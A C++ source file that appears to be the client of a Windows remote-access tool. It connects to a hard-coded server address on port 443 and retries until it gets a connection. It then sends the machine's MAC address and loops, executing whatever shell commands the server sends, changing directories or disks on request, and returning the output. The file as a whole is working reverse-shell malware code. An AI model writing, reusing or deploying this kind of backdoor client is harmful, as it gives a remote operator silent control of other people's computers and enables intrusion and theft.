#include "../Shared/NetworkUtilities.h"
#include "../Shared/Utils.h"
#include "ClientUtils.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
using namespace std;

#define DEBUG
#define ADDR "127.0.0.1"
#define PORT 443

string MAC;
int id;

vector<string> dir;

int main(int argc, char** argv) {
	MAC = getMAC();

	parseDir(dir, getDir());

	WSAData wsaData;
	if (WSAStartup(MAKEWORD(2, 1), &wsaData)) {
#ifdef DEBUG
		cout << "Winsock startup failed" << endl;
#endif
		exit(1);
	}

	SOCKADDR_IN addr;
	int addr_len = sizeof(addr);
	inet_pton(AF_INET, ADDR, &addr.sin_addr);
	addr.sin_port = htons(PORT);
	addr.sin_family = AF_INET;

	SOCKET conn = socket(AF_INET, SOCK_STREAM, NULL);
	while (connect(conn, (SOCKADDR*)&addr, addr_len) == INVALID_SOCKET) {
		Sleep(1000);
#ifdef DEBUG
		cout << "Can't connect to " << ADDR << ":" << PORT << endl;
#endif
	}

#ifdef DEBUG
	cout << "Connected!" << endl;
#endif

	SocketData packet;

	_recv(conn, packet);	// Send id to server
	id = string_to_int(packet.data);

	_send(conn, SocketTag::SET_MAC, MAC);
	
	while (true) {
		_recv_wait(conn, packet);
		string response;

		switch (packet.tag) {
			case SocketTag::EXEC: {
				cout << packet.data << endl;
				response = exec(dir, packet.data);
				break;
			}
			case SocketTag::SET_CMD_DIR: {
				response = setDirCmd(dir, packet.data);
				break;
			}
			case SocketTag::SET_CMD_DISK: {
				dir = vector<string>();
				dir.push_back(packet.data);
				response = "DISK CHANGED TO " + packet.data;
				break;
			}
			case SocketTag::GET_CMD_DIR: {
				response = parseDir(dir);
				_send(conn, SocketTag::GET_CMD_DIR, response.c_str());
				continue;
			}
		}

		_send(conn, SocketTag::EXEC, response.c_str());
	}

	closesocket(conn);
	WSACleanup();


#ifdef DEBUG
	system("pause");
#endif

	return 0;
}